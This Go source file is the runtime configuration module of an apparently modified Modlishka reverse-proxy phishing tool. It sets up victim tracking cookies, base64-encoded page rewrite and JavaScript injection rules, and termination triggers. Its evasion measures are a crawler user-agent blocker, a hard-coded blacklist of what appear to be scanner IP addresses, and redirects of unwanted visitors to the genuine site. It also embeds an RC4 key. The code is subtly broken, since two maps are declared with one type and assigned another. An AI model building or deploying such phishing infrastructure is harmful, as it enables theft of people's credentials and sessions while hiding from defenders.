package runtime

import (
    "github.com/drk1wi/Modlishka/config"
    "golang.org/x/net/publicsuffix"
    "encoding/base64"
    "strings"
    "regexp"
    "bufio"
    //"log"
    "github.com/drk1wi/Modlishka/log"
    "os"
    "path/filepath"
)

// file paths
var (
    BlockListPath    string
    RobotFilePath    string
)

// compiled regexp
var (
    RegexpUrl                            *regexp.Regexp
    RegexpSubdomainWithoutScheme         *regexp.Regexp
    RegexpPhishSubdomainUrlWithoutScheme *regexp.Regexp
    RegexpCookieTracking                 *regexp.Regexp
    RegexpSubdomain                      *regexp.Regexp
    RegexpFindSetCookie                  *regexp.Regexp
    RegexpSetCookie                      *regexp.Regexp
    RegexpEmail                          *regexp.Regexp
)

//runtime config
var (
    ProxyDomain    string
    TrackingCookie string
    TrackingParam  string
    Tracker        string

    TopLevelDomain string
    Target         string
    ProxyAddress   string
    ForwardTo      string

    UnauthRedirectUrl  string

    IsTracked          map[string]string
    IsLanded           map[string]string

    ReplaceStrings     map[string]string
    JSInjectStrings    map[string]string
    TargetResources    []string
    TerminateTriggers  []string

    Landing            bool
    DynamicMode        bool
    ForceHTTPS         bool
    ForceHTTP          bool
    AllowSecureCookies bool

    Robots             []string
    Blacklist          map[string]bool
    Whitelist          map[string]bool

    //openssl rand -hex 32
    RC4_KEY = `938d870b1cdd0b52a99e1247e08c673d072aa97cf0ccbef941a7f525fe02b70d`
)

func RenameMe(n string) string {
    for true {
        if !(strings.Contains(n, "/")) {
            n = string("./filters/") + n
        }
        if !(strings.Contains(filepath.Ext(n), "conf")) {
            n = n + string(".conf")
        }
        if (strings.Contains(n, "/filters/")) && (strings.Contains(n, ".conf")){
            log.Infof("Runtime: Reading configuration file ~> ( %s )", n)
            break
        }
    }
    return n
}

// Set up runtime core config
func SetCoreRuntimeConfig(conf config.Options) {

    Target = *conf.Target
    ProxyAddress = *conf.ProxyAddress
    ProxyDomain = *conf.ProxyDomain
    
    Tracker = "client_id"
    IsTracked = make(map[string]bool)

    Landing = false
    IsLanded = make(map[string]bool)

    Robots = make([]string, 0)
    Blacklist = make(map[string]bool)
    Whitelist = make(map[string]bool)

    if len(*conf.TrackingCookie) > 0 {
        TrackingCookie = *conf.TrackingCookie
        Tracker = TrackingCookie
    }

    if len(*conf.TrackingParam) > 0 {
        TrackingParam = *conf.TrackingParam
        Tracker = TrackingParam
    }

    if len(*conf.ForwardTo) > 0{
        ForwardTo = *conf.ForwardTo
        if strings.Index(ForwardTo, "/") !=0 {
            ForwardTo = "/" + ForwardTo
        }
        Landing = true
    }

    domain, _ := publicsuffix.EffectiveTLDPlusOne(*conf.Target)
    TopLevelDomain = StripProtocol(domain)

    if len(*conf.UnauthRedirectUrl) > 0 {
        UnauthRedirectUrl= *conf.UnauthRedirectUrl
    }else{
        UnauthRedirectUrl= string("https://www.")+TopLevelDomain
    }

    if len(*conf.TargetRes) > 0 {
        TargetResources = strings.Split(string(*conf.TargetRes), ",")
    }

    if len(*conf.TerminateTriggers) != 0 {
        TerminateTriggers = strings.Split(string(*conf.TerminateTriggers), ",")
        for i, v := range TerminateTriggers {
            TerminateTriggers[i] = v
        }
        log.Infof("Termination Triggers :: %s", TerminateTriggers)
    }

    if len(*conf.TargetRules) != 0 {
        ReplaceStrings = make(map[string]string)
        for _, v := range strings.Split(string(*conf.TargetRules), ",") {
            r := strings.Split(v, ":")
            dk, err := base64.StdEncoding.DecodeString(r[0])
            if err != nil {
                log.Fatalf("Unable to decode parameter value %s . Terminating.", r[0])
            }

            dv, err := base64.StdEncoding.DecodeString(r[1])
            if err != nil {
                log.Fatalf("Unable to decode parameter value %s . Terminating.", r[1])
            }

            ReplaceStrings[string(dk)] = string(dv)
        }
    }

    if len(*conf.JsRules) != 0 {
        JSInjectStrings = make(map[string]string)
        for _, val := range strings.Split(string(*conf.JsRules), ",") {
            res := strings.Split(val, ":")
            durl, err := base64.StdEncoding.DecodeString(res[0])
            if err != nil {
                log.Fatalf("Unable to decode JSurl parameter value %s", res[0])
            }
            dval, err := base64.StdEncoding.DecodeString(res[1])
            if err != nil {
                log.Fatalf("Unable to decode JSval parameter value %s", res[1])
            }
            JSInjectStrings[string(durl)] = string(dval)
        }
    }

    //Robots and crawlers
    if len(*conf.BotList) != 0 {
        RobotFilePath := RenameMe(*conf.BotList)
        // Read file
        ct, err := os.OpenFile(RobotFilePath, os.O_RDONLY, 0644)
        if err != nil {
            log.Errorf("Robots User-Agent Blocker: Error opening file (%s): %s .", RobotFilePath, err)
            Robots = append(Robots, string(""))
        }
        defer ct.Close()

        fs := bufio.NewScanner(ct)
        fs.Split(bufio.ScanLines)
        n := 0
        for fs.Scan() {
            n += 1
            l := fs.Text()
            l = strings.Trim(l, " ")
            if len(l) > 1 {
                Robots = append(Robots, l)
            }
        }
        log.Infof("Robots User-Agent Blocker: Loaded %d user-agent strings", len(Robots))
    }

    DynamicMode = *conf.DynamicMode
    ForceHTTPS = *conf.ForceHTTPS
    ForceHTTP = *conf.ForceHTTP
    AllowSecureCookies = *conf.AllowSecureCookies

    // Parsing and comparing IP/CIDR seriously increases server response time
    // So add some core blacklisted IP(s) and let apache handle the rest
    Blacklist["52.188.34.21"] = true
    Blacklist["108.174.8.21"] = true
    Blacklist["185.196.220.70"] = true
    Blacklist["3.72.74.40"] = true
    Blacklist["89.187.162.185"] =true
    Blacklist["139.59.44.48"] =true
    Blacklist["50.0.2.196"] = true
    //Whitelist["127.0.0.1"] = true
}

